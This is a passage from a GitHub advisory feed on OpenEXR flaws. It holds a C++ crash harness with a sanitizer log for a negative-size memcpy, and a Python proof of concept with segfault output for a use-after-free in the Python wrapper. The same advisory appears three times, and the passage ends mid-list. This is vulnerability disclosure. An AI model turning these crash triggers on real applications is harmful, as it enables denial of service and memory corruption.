        Imf::MemMapIStream stream (crash_data, sizeof (crash_data));
        Imf::MultiPartInputFile file (stream);
    }
    catch (const std::exception&amp; e)
    {
        std::cout &lt;&lt; "Exception: " &lt;&lt; e.what () &lt;&lt; "\n";
    }

    return 0;
}
</code></pre>
<p><strong>PoC Input:</strong> <a href="https://drive.google.com/file/d/1VhjdK11LA0LHdW1mJJIQEo64mc5tpOUV/view?usp=drive_link">https://drive.google.com/file/d/1VhjdK11LA0LHdW1mJJIQEo64mc5tpOUV/view?usp=drive_link</a></p>
<h2 id="asan-log">ASAN Log</h2>
<pre><code>==305348==ERROR: AddressSanitizer: negative-size-param: (size=-4096)
    #0 0x62aee9fc732a in __asan_memcpy (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x23932a) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0)
    #1 0x62aeea0e3377 in Imf_4_0::istream_nonparallel_read(_priv_exr_context_t const*, void*, void*, unsigned long, unsigned long, int (*)(_priv_exr_context_t const*, int, char const*, ...)) /home/wjddn0623/fuzzing/openexr/src/lib/OpenEXR/ImfContextInit.cpp:136:21
    #2 0x62aeea15e75b in dispatch_read /home/wjddn0623/fuzzing/openexr/src/lib/OpenEXRCore/context.c:51:16
    #3 0x62aeea19da19 in scratch_seq_skip /home/wjddn0623/fuzzing/openexr/src/lib/OpenEXRCore/parse_header.c:202:29
    #4 0x62aeea197ec9 in check_populate_tiles /home/wjddn0623/fuzzing/openexr/src/lib/OpenEXRCore/parse_header.c:1560:9
    #5 0x62aeea197ec9 in check_req_attr /home/wjddn0623/fuzzing/openexr/src/lib/OpenEXRCore/parse_header.c:2020:24
    #6 0x62aeea197ec9 in pull_attr /home/wjddn0623/fuzzing/openexr/src/lib/OpenEXRCore/parse_header.c:2085:10
    #7 0x62aeea197ec9 in internal_exr_parse_header /home/wjddn0623/fuzzing/openexr/src/lib/OpenEXRCore/parse_header.c:2848:18
    #8 0x62aeea15f578 in exr_start_read /home/wjddn0623/fuzzing/openexr/src/lib/OpenEXRCore/context.c:270:49
    #9 0x62aeea0d8130 in Imf_4_0::Context::Context(char const*, Imf_4_0::ContextInitializer const&amp;, Imf_4_0::Context::read_mode_t) /home/wjddn0623/fuzzing/openexr/src/lib/OpenEXR/ImfContext.cpp:124:10
    #10 0x62aeea0633ab in Imf_4_0::MultiPartInputFile::MultiPartInputFile(char const*, Imf_4_0::ContextInitializer const&amp;, int, bool) /home/wjddn0623/fuzzing/openexr/src/lib/OpenEXR/ImfMultiPartInputFile.cpp:59:7
    #11 0x62aeea0649de in Imf_4_0::MultiPartInputFile::MultiPartInputFile(Imf_4_0::IStream&amp;, int, bool) /home/wjddn0623/fuzzing/openexr/src/lib/OpenEXR/ImfMultiPartInputFile.cpp:96:7
    #12 0x62aeea00d522 in fuzz_cpp_headers(char const*, unsigned long) /home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer.cc:167:31
    #13 0x62aeea00d522 in fuzz_cpp_api(char const*, unsigned long) /home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer.cc:460:5
    #14 0x62aeea00a156 in LLVMFuzzerTestOneInput /home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer.cc:927:5
    #15 0x62aee9f15414 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x187414) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0)
    #16 0x62aee9efe546 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x170546) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0)
    #17 0x62aee9f03ffa in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x175ffa) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0)
    #18 0x62aee9f2e7b6 in main (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x1a07b6) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0)
    #19 0x71035ee2a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #20 0x71035ee2a28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #21 0x62aee9ef9114 in _start (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x16b114) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0)

0x503000000235 is located 0 bytes after 21-byte region [0x503000000220,0x503000000235)
allocated by thread T0 here:
    #0 0x62aeea007c61 in operator new[](unsigned long) (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x279c61) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0)
    #1 0x62aee9f15325 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x187325) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0)
    #2 0x62aee9efe546 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x170546) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0)
    #3 0x62aee9f03ffa in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x175ffa) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0)
    #4 0x62aee9f2e7b6 in main (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x1a07b6) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0)
    #5 0x71035ee2a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #6 0x71035ee2a28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #7 0x62aee9ef9114 in _start (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x16b114) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0)

SUMMARY: AddressSanitizer: negative-size-param (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x23932a) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0) in __asan_memcpy
==305348==ABORTING
</code></pre>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>DoS</strong> — Any application that opens a crafted EXR file will crash immediately</li>
<li><strong>CWE-195</strong> (Signed to Unsigned Conversion Error) → <strong>CWE-122</strong> (Heap-based Buffer Overflow)</li>
<li>Affects any application using an <code>IStream</code> implementation where <code>isMemoryMapped()</code> returns <code>true</code></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/AcademySoftwareFoundation/openexr/security/advisories/GHSA-q6vj-wxvf-5m8c">https://github.com/AcademySoftwareFoundation/openexr/security/advisories/GHSA-q6vj-wxvf-5m8c</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-26981">https://nvd.nist.gov/vuln/detail/CVE-2026-26981</a></li>
<li><a href="https://github.com/AcademySoftwareFoundation/openexr/commit/6bb2ddf1068573d073edf81270a015b38cc05cef">https://github.com/AcademySoftwareFoundation/openexr/commit/6bb2ddf1068573d073edf81270a015b38cc05cef</a></li>
<li><a href="https://github.com/AcademySoftwareFoundation/openexr/commit/d2be382758adc3e9ab83a3de35138ec28d93ebd8">https://github.com/AcademySoftwareFoundation/openexr/commit/d2be382758adc3e9ab83a3de35138ec28d93ebd8</a></li>
<li><a href="https://github.com/advisories/GHSA-q6vj-wxvf-5m8c">https://github.com/advisories/GHSA-q6vj-wxvf-5m8c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q6vj-wxvf-5m8c</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-06T17:51:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[OpenEXR] OpenEXR has use after free in PyObject_StealAttrString]]></title>
        <id>https://github.com/advisories/GHSA-57cw-j6vp-2p9m</id>
        <link href="https://github.com/advisories/GHSA-57cw-j6vp-2p9m"/>
        <updated>2026-04-06T17:51:24.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>There is a use-after-free in PyObject_StealAttrString of pyOpenEXR_old.cpp.</p>
<p>This bug was found with <a href="https://zeropath.com/?utm_source=joshua.hu">ZeroPath</a>.</p>
<h3 id="details">Details</h3>
<p>The legacy adapter defines PyObject_StealAttrString that calls PyObject_GetAttrString to obtain a new reference, immediately decrefs it, and returns the pointer. Callers then pass this dangling pointer to APIs like PyLong_AsLong/PyFloat_AsDouble, resulting in a use-after-free. This is invoked in multiple places (e.g., reading PixelType.v, Box2i, V2f, etc.).</p>
<p><a href="https://github.com/AcademySoftwareFoundation/openexr/blob/b3a19903db0672c63055023aa788e592b16ec3c5/src/wrappers/python/PyOpenEXR_old.cpp#L109-L115">https://github.com/AcademySoftwareFoundation/openexr/blob/b3a19903db0672c63055023aa788e592b16ec3c5/src/wrappers/python/PyOpenEXR_old.cpp#L109-L115</a></p>
<p><a href="https://github.com/AcademySoftwareFoundation/openexr/blob/b3a19903db0672c63055023aa788e592b16ec3c5/src/wrappers/python/PyOpenEXR_old.cpp#L380-L387">https://github.com/AcademySoftwareFoundation/openexr/blob/b3a19903db0672c63055023aa788e592b16ec3c5/src/wrappers/python/PyOpenEXR_old.cpp#L380-L387</a></p>
<p><a href="https://github.com/AcademySoftwareFoundation/openexr/blob/b3a19903db0672c63055023aa788e592b16ec3c5/src/wrappers/python/PyOpenEXR_old.cpp#L1258-L1286">https://github.com/AcademySoftwareFoundation/openexr/blob/b3a19903db0672c63055023aa788e592b16ec3c5/src/wrappers/python/PyOpenEXR_old.cpp#L1258-L1286</a></p>
<h3 id="poc">PoC</h3>
<pre><code class="language-py">import OpenEXR, Imath

# Any small EXR will do - use one from OpenEXR test images or any project file
path = "any_small.exr"

# Property returns a fresh temporary int subclass, so the buggy helper
# decrefs it to zero before passing it to PyLong_AsLong =&gt; UAF.
class FreshInt(int):
    def __new__(cls, v):
        return int.__new__(cls, v)
    def __del__(self):
        # stir the heap to make the UAF obvious under PYTHONMALLOC=debug
        _ = bytearray(1_000_000)

class PixelTypeProxy:
    @property
    def v(self):
        return FreshInt(Imath.PixelType.FLOAT)  # any small value is fine

f = OpenEXR.InputFile(path)
# channel() forces the wrapper to read pixel_type.v using the buggy helper
# which returns a dangling pointer
print("About to trigger UAF...")
f.channel("R", pixel_type=PixelTypeProxy())
print("If you get here without a crash, try again with AddressSanitizer.")
</code></pre>
<p>running</p>
<pre><code class="language-shell">PYTHONMALLOC=debug PYTHONDEVMODE=1 python3 pt.py
</code></pre>
<pre><code>About to trigger UAF...
Fatal Python error: Segmentation fault

Current thread 0x00000001f209a140 (most recent call first):
  File "/private/tmp/i/pt.py", line 24 in &lt;module&gt;

Current thread's C stack trace (most recent call first):
  Binary file "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python", at _Py_DumpStack+0x44 [0x1058c00f8]
  Binary file "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python", at faulthandler_dump_c_stack+0x58 [0x1058d2f3c]
  Binary file "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python", at faulthandler_fatal_error+0x160 [0x1058d2e00]
  Binary file "/usr/lib/system/libsystem_platform.dylib", at _sigtramp+0x38 [0x1841796a4]
  Binary file "/private/tmp/i/lib/python3.14/site-packages/OpenEXR.cpython-314-darwin.so", at _Z16init_OpenEXR_oldP7_object+0x1010 [0x105cb9e94]
  Binary file "/private/tmp/i/lib/python3.14/site-packages/OpenEXR.cpython-314-darwin.so", at _Z16init_OpenEXR_oldP7_object+0x1010 [0x105cb9e94]
  Binary file "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python", at method_vectorcall_VARARGS_KEYWORDS+0x94 [0x1057032bc]
  Binary file "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python", at PyObject_Vectorcall+0x58 [0x1056f5044]
  Binary file "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python", at _PyEval_EvalFrameDefault+0x9cac [0x1058312d8]
  Binary file "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python", at PyEval_EvalCode+0xf8 [0x105827130]
  Binary file "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python", at run_mod+0xac [0x1058a2b60]
  Binary file "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python", at pyrun_file+0xa4 [0x1058a123c]
  Binary file "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python", at _PyRun_SimpleFileObject+0x100 [0x1058a07c0]
  Binary file "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python", at _PyRun_AnyFileObject+0x50 [0x1058a0424]
  Binary file "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python", at pymain_run_file_obj+0xa4 [0x1058cfcd8]
  Binary file "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python", at pymain_run_file+0x48 [0x1058cfa20]
  Binary file "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python", at Py_RunMain+0x354 [0x1058cef60]
  Binary file "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python", at pymain_main+0xe8 [0x1058cf3f8]
  Binary file "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python", at Py_BytesMain+0x28 [0x1058cf494]
  Binary file "/usr/lib/dyld", at start+0x17bc [0x183d9eb98]

Extension modules: numpy._core._multiarray_umath, numpy.linalg._umath_linalg (total: 2)
Segmentation fault: 11     PYTHONMALLOC=debug PYTHONDEVMODE=1 python3 pt.py
</code></pre>
<h3 id="impact">Impact</h3>
<p>Completely depends on the context. Typical memory stuff related to UAFs.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/AcademySoftwareFoundation/openexr/security/advisories/GHSA-57cw-j6vp-2p9m">https://github.com/AcademySoftwareFoundation/openexr/security/advisories/GHSA-57cw-j6vp-2p9m</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-64183">https://nvd.nist.gov/vuln/detail/CVE-2025-64183</a></li>
<li><a href="https://github.com/AcademySoftwareFoundation/openexr/blob/b3a19903db0672c63055023aa788e592b16ec3c5/src/wrappers/python/PyOpenEXR_old.cpp#L109-L115">https://github.com/AcademySoftwareFoundation/openexr/blob/b3a19903db0672c63055023aa788e592b16ec3c5/src/wrappers/python/PyOpenEXR_old.cpp#L109-L115</a></li>
<li><a href="https://github.com/advisories/GHSA-57cw-j6vp-2p9m">https://github.com/advisories/GHSA-57cw-j6vp-2p9m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-57cw-j6vp-2p9m</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-06T17:51:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[OpenEXR] OpenEXR has use after free in PyObject_StealAttrString]]></title>
        <id>https://github.com/advisories/GHSA-57cw-j6vp-2p9m</id>
        <link href="https://github.com/advisories/GHSA-57cw-j6vp-2p9m"/>
        <updated>2026-04-06T17:51:24.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>There is a use-after-free in PyObject_StealAttrString of pyOpenEXR_old.cpp.</p>
<p>This bug was found with <a href="https://zeropath.com/?utm_source=joshua.hu">ZeroPath</a>.</p>
<h3 id="details">Details</h3>
<p>The legacy adapter defines PyObject_StealAttrString that calls PyObject_GetAttrString to obtain a new reference, immediately decrefs it, and returns the pointer. Callers then pass this dangling pointer to APIs like PyLong_AsLong/PyFloat_AsDouble, resulting in a use-after-free. This is invoked in multiple places (e.g., reading PixelType.v, Box2i, V2f, etc.).</p>
<p><a href="https://github.com/AcademySoftwareFoundation/openexr/blob/b3a19903db0672c63055023aa788e592b16ec3c5/src/wrappers/python/PyOpenEXR_old.cpp#L109-L115">https://github.com/AcademySoftwareFoundation/openexr/blob/b3a19903db0672c63055023aa788e592b16ec3c5/src/wrappers/python/PyOpenEXR_old.cpp#L109-L115</a></p>
<p><a href="https://github.com/AcademySoftwareFoundation/openexr/blob/b3a19903db0672c63055023aa788e592b16ec3c5/src/wrappers/python/PyOpenEXR_old.cpp#L380-L387">https://github.com/AcademySoftwareFoundation/openexr/blob/b3a19903db0672c63055023aa788e592b16ec3c5/src/wrappers/python/PyOpenEXR_old.cpp#L380-L387</a></p>
<p><a href="https://github.com/AcademySoftwareFoundation/openexr/blob/b3a19903db0672c63055023aa788e592b16ec3c5/src/wrappers/python/PyOpenEXR_old.cpp#L1258-L1286">https://github.com/AcademySoftwareFoundation/openexr/blob/b3a19903db0672c63055023aa788e592b16ec3c5/src/wrappers/python/PyOpenEXR_old.cpp#L1258-L1286</a></p>
<h3 id="poc">PoC</h3>
<pre><code class="language-py">import OpenEXR, Imath

# Any small EXR will do - use one from OpenEXR test images or any project file
path = "any_small.exr"

# Property returns a fresh temporary int subclass, so the buggy helper
# decrefs it to zero before passing it to PyLong_AsLong =&gt; UAF.
class FreshInt(int):
    def __new__(cls, v):
        return int.__new__(cls, v)
    def __del__(self):
        # stir the heap to make the UAF obvious under PYTHONMALLOC=debug
        _ = bytearray(1_000_000)

class PixelTypeProxy:
    @property
    def v(self):
        return FreshInt(Imath.PixelType.FLOAT)  # any small value is fine

f = OpenEXR.InputFile(path)
# channel() forces the wrapper to read pixel_type.v using the buggy helper
# which returns a dangling pointer
print("About to trigger UAF...")
f.channel("R", pixel_type=PixelTypeProxy())
print("If you get here without a crash, try again with AddressSanitizer.")
</code></pre>
<p>running</p>
<pre><code class="language-shell">PYTHONMALLOC=debug PYTHONDEVMODE=1 python3 pt.py
</code></pre>
<pre><code>About to trigger UAF...
Fatal Python error: Segmentation fault

Current thread 0x00000001f209a140 (most recent call first):
  File "/private/tmp/i/pt.py", line 24 in &lt;module&gt;

Current thread's C stack trace (most recent call first):
  Binary file "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python", at _Py_DumpStack+0x44 [0x1058c00f8]
  Binary file "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python", at faulthandler_dump_c_stack+0x58 [0x1058d2f3c]
  Binary file "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python", at faulthandler_fatal_error+0x160 [0x1058d2e00]
  Binary file "/usr/lib/system/libsystem_platform.dylib", at _sigtramp+0x38 [0x1841796a4]
  Binary file "/private/tmp/i/lib/python3.14/site-packages/OpenEXR.cpython-314-darwin.so", at _Z16init_OpenEXR_oldP7_object+0x1010 [0x105cb9e94]
  Binary file "/private/tmp/i/lib/python3.14/site-packages/OpenEXR.cpython-314-darwin.so", at _Z16init_OpenEXR_oldP7_object+0x1010 [0x105cb9e94]
  Binary file "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python", at method_vectorcall_VARARGS_KEYWORDS+0x94 [0x1057032bc]
  Binary file "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python", at PyObject_Vectorcall+0x58 [0x1056f5044]
  Binary file "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python", at _PyEval_EvalFrameDefault+0x9cac [0x1058312d8]
  Binary file "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python", at PyEval_EvalCode+0xf8 [0x105827130]
  Binary file "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python", at run_mod+0xac [0x1058a2b60]
  Binary file "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python", at pyrun_file+0xa4 [0x1058a123c]
  Binary file "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python", at _PyRun_SimpleFileObject+0x100 [0x1058a07c0]
  Binary file "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python", at _PyRun_AnyFileObject+0x50 [0x1058a0424]
  Binary file "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python", at pymain_run_file_obj+0xa4 [0x1058cfcd8]
  Binary file "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python", at pymain_run_file+0x48 [0x1058cfa20]
  Binary file "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python", at Py_RunMain+0x354 [0x1058cef60]
  Binary file "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python", at pymain_main+0xe8 [0x1058cf3f8]
  Binary file "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python", at Py_BytesMain+0x28 [0x1058cf494]
  Binary file "/usr/lib/dyld", at start+0x17bc [0x183d9eb98]

Extension modules: numpy._core._multiarray_umath, numpy.linalg._umath_linalg (total: 2)
Segmentation fault: 11     PYTHONMALLOC=debug PYTHONDEVMODE=1 python3 pt.py
</code></pre>
<h3 id="impact">Impact</h3>
<p>Completely depends on the context. Typical memory stuff related to UAFs.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/AcademySoftwareFoundation/openexr/security/advisories/GHSA-57cw-j6vp-2p9m">https://github.com/AcademySoftwareFoundation/openexr/security/advisories/GHSA-57cw-j6vp-2p9m</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-64183">https://nvd.nist.gov/vuln/detail/CVE-2025-64183</a></li>
<li><a href="https://github.com/AcademySoftwareFoundation/openexr/blob/b3a19903db0672c63055023aa788e592b16ec3c5/src/wrappers/python/PyOpenEXR_old.cpp#L109-L115">https://github.com/AcademySoftwareFoundation/openexr/blob/b3a19903db0672c63055023aa788e592b16ec3c5/src/wrappers/python/PyOpenEXR_old.cpp#L109-L115</a></li>
<li><a href="https://github.com/advisories/GHSA-57cw-j6vp-2p9m">https://github.com/advisories/GHSA-57cw-j6vp-2p9m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-57cw-j6vp-2p9m</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-06T17:51:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[OpenEXR] OpenEXR has use after free in PyObject_StealAttrString]]></title>
        <id>https://github.com/advisories/GHSA-57cw-j6vp-2p9m</id>
        <link href="https://github.com/advisories/GHSA-57cw-j6vp-2p9m"/>
        <updated>2026-04-06T17:51:24.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>There is a use-after-free in PyObject_StealAttrString of pyOpenEXR_old.cpp.</p>
<p>This bug was found with <a href="https://zeropath.com/?utm_source=joshua.hu">ZeroPath</a>.</p>
<h3 id="details">Details</h3>
<p>The legacy adapter defines PyObject_StealAttrString that calls PyObject_GetAttrString to obtain a new reference, immediately decrefs it, and returns the pointer. Callers then pass this dangling pointer to APIs like PyLong_AsLong/PyFloat_AsDouble, resulting in a use-after-free. This is invoked in multiple places (e.g., reading PixelType.v, Box2i, V2f, etc.).</p>
<p><a href="https://github.com/AcademySoftwareFoundation/openexr/blob/b3a19903db0672c63055023aa788e592b16ec3c5/src/wrappers/python/PyOpenEXR_old.cpp#L109-L115">https://github.com/AcademySoftwareFoundation/openexr/blob/b3a19903db0672c63055023aa788e592b16ec3c5/src/wrappers/python/PyOpenEXR_old.cpp#L109-L115</a></p>
<p><a href="https://github.com/AcademySoftwareFoundation/openexr/blob/b3a19903db0672c63055023aa788e592b16ec3c5/src/wrappers/python/PyOpenEXR_old.cpp#L380-L387">https://github.com/AcademySoftwareFoundation/openexr/blob/b3a19903db0672c63055023aa788e592b16ec3c5/src/wrappers/python/PyOpenEXR_old.cpp#L380-L387</a></p>
<p><a href="https://github.com/AcademySoftwareFoundation/openexr/blob/b3a19903db0672c63055023aa788e592b16ec3c5/src/wrappers/python/PyOpenEXR_old.cpp#L1258-L1286">https://github.com/AcademySoftwareFoundation/openexr/blob/b3a19903db0672c63055023aa788e592b16ec3c5/src/wrappers/python/PyOpenEXR_old.cpp#L1258-L1286</a></p>
<h3 id="poc">PoC</h3>
<pre><code class="language-py">import OpenEXR, Imath

# Any small EXR will do - use one from OpenEXR test images or any project file
path = "any_small.exr"

# Property returns a fresh temporary int subclass, so the buggy helper
# decrefs it to zero before passing it to PyLong_AsLong =&gt; UAF.
class FreshInt(int):
    def __new__(cls, v):
        return int.__new__(cls, v)
    def __del__(self):
        # stir the heap to make the UAF obvious under PYTHONMALLOC=debug
        _ = bytearray(1_000_000)

class PixelTypeProxy:
    @property
    def v(self):
        return FreshInt(Imath.PixelType.FLOAT)  # any small value is fine

f = OpenEXR.InputFile(path)
# channel() forces the wrapper to read pixel_type.v using the buggy helper
# which returns a dangling pointer
print("About to trigger UAF...")
f.channel("R", pixel_type=PixelTypeProxy())
print("If you get here without a crash, try again with AddressSanitizer.")
</code></pre>
<p>running</p>
<pre><code class="language-shell">PYTHONMALLOC=debug PYTHONDEVMODE=1 python3 pt.py
</code></pre>
<pre><code>About to trigger UAF...
Fatal Python error: Segmentation fault

Current thread 0x00000001f209a140 (most recent call first):
  File "/private/tmp/i/pt.py", line 24 in &lt;module&gt;

Current thread's C stack trace (most recent call first):
  Binary file "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python", at _Py_DumpStack+0x44 [0x1058c00f8]
  Binary file "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python", at faulthandler_dump_c_stack+0x58 [0x1058d2f3c]
  Binary file "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python", at faulthandler_fatal_error+0x160 [0x1058d2e00]
  Binary file "/usr/lib/system/libsystem_platform.dylib", at _sigtramp+0x38 [0x1841796a4]
  Binary file "/private/tmp/i/lib/python3.14/site-packages/OpenEXR.cpython-314-darwin.so", at _Z16init_OpenEXR_oldP7_object+0x1010 [0x105cb9e94]
  Binary file "/private/tmp/i/lib/python3.14/site-packages/OpenEXR.cpython-314-darwin.so", at _Z16init_OpenEXR_oldP7_object+0x1010 [0x105cb9e94]
  Binary file "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python", at method_vectorcall_VARARGS_KEYWORDS+0x94 [0x1057032bc]
  Binary file "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python", at PyObject_Vectorcall+0x58 [0x1056f5044]
  Binary file "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python", at _PyEval_EvalFrameDefault+0x9cac [0x1058312d8]
  Binary file "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python", at PyEval_EvalCode+0xf8 [0x105827130]
  Binary file "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python", at run_mod+0xac [0x1058a2b60]
  Binary file "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python", at pyrun_file+0xa4 [0x1058a123c]
  Binary file "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python", at _PyRun_SimpleFileObject+0x100 [0x1058a07c0]
  Binary file "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python", at _PyRun_AnyFileObject+0x50 [0x1058a0424]
  Binary file "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python", at pymain_run_file_obj+0xa4 [0x1058cfcd8]
  Binary file "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python", at pymain_run_file+0x48 [0x1058cfa20]
  Binary file "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python", at Py_RunMain+0x354 [0x1058cef60]
  Binary file "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python", at pymain_main+0xe8 [0x1058cf3f8]
  Binary file "/opt/homebrew/Cellar/python@3.14/3.14.0/Frameworks/Python.framework/Versions/3.14/Python", at Py_BytesMain+0x28 [0x1058cf494]
  Binary file "/usr/lib/dyld", at start+0x17bc [0x183d9eb98]

Extension modules: numpy._core._multiarray_umath, numpy.linalg._umath_linalg (total: 2)
Segmentation fault: 11     PYTHONMALLOC=debug PYTHONDEVMODE=1 python3 pt.py
</code></pre>
<h3 id="impact">Impact</h3>
<p>Completely depends on the context. Typical memory stuff related to UAFs.</p>
<h3 id="references">References</h3>
<ul>
